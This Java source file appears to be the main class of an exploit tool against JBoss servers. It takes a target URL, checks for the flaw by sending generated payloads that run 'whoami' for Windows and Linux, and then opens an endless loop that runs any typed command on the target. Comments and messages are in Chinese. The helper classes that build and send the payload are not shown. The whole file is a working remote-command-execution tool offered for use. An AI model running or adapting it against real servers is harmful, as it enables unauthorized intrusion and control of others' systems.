package com.jboss.main;

import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import java.awt.GridLayout;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.awt.event.ActionEvent;
import javax.swing.JLabel;
import java.awt.Font;
import java.util.Scanner;
import javax.swing.SwingConstants;
import javax.swing.JTextArea;
import javax.swing.JComboBox;
import javax.swing.JTextPane;
import javax.swing.JScrollPane;

public class main {

    public static Payload payload = new Payload();
    public static String result = null;
    public static byte[] Payload = null;
    public static String os = "";
    public static String jboss_ip = "";

    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable() {
            public void run() {
                initialize();
            }
        });
    }

    public static void initialize() {

        Scanner scan = new Scanner(System.in);
        System.out.print("jboss url:");
        jboss_ip = scan.nextLine();
        try {
            try {
                try {
                    Payload = payload.PayloadGeneration("whoami", "windows");
                    result = doPost.DoPost(jboss_ip, Payload);
                    System.out.println(result);
                }catch (Exception e) {
                    System.out.println("windows 执行 whoami 异常");;
                }
                Payload = payload.PayloadGeneration("whoami", "linux");
                result = doPost.DoPost(jboss_ip, Payload);
                System.out.println(result);
            }catch (Exception e) {
                System.out.println("linux 执行 whoami 异常");
                System.out.println("漏洞不存在");
                System.exit(1);
            }

        } catch (Exception e) {
            System.out.println("异常");
            System.exit(1);
        }

        System.out.print("os:");
        String os_ = scan.nextLine();
        while (true) {
            try {
                System.out.print("执行的命令:");
                String cmd_ = scan.nextLine();
                Payload = payload.PayloadGeneration(cmd_, os_);
                result = doPost.DoPost(jboss_ip, Payload);
                System.out.println(result);
            } catch (Exception e) {
                System.out.println("异常");
            }
        }


    }
}
